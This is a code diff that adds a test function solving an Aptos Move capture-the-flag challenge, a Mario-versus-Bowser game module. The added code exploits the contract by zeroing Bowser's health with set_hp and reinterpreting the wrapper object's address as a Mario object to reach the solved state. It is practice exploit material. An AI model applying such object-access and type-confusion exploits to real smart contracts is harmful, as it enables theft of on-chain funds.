@@ -123,4 +123,26 @@ module challenge::router2 {
         let peach = borrow_global<Peach>(get_wrapper());
         assert!(!peach.kidnapped, 4);
     }
+
+    // solution
+    #[test(account = @1338, challenger = @challenger, challenge = @challenge, aptos_framework = @0x1)]
+    public entry fun solve(account: &signer, challenger: &signer,challenge :&signer) acquires Config, Bowser, Mario, Peach {
+        initialize(challenger);
+        let mario_addr = start_game(account);
+        let mario_obj = object::address_to_object<Mario>(mario_addr);
+        for (i in 0..127) {
+            train_mario(account, mario_obj);
+        };
+
+        battle(account, mario_obj);
+
+        let wrapper_addr = get_wrapper();
+        let browser_obj = object::address_to_object<Bowser>(wrapper_addr);
+        set_hp(account, browser_obj, 0);
+
+        let new_mario_obj = object::address_to_object<Mario>(wrapper_addr);
+        train_mario(account, new_mario_obj);
+        battle(account, mario_obj);
+        is_solved(account);
+    }
 }
